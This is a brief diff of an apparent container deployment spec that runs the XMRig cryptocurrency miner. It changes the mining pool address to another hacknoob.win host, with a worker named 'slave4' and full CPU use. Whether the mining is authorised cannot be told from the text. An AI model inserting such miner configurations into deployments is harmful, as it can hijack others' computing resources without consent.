@@ -18,7 +18,7 @@ spec:
     command:
     - /home/worker4/xmrig/build/xmrig
     - -o
-    - proxy.hacknoob.win:5554
+    - node.hacknoob.win:18081
     - -u
     - slave4
     - --cpu-no-yield
